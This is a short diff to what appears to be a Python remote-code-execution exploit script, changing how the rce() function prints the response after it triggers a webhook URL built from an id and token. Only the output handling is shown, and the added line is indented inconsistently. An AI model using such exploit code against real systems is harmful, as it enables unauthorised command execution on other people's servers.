@@ -137,7 +137,8 @@ def rce(url,cmd):
 	# Triggering RCE
 	u = url + '/hooks/' + _id + '/' +token
 	r = requests.get(u)
-	print(r.text)
+	res = json.loads(r.text)
+        print(res["message"])
 
 ############################################################
 
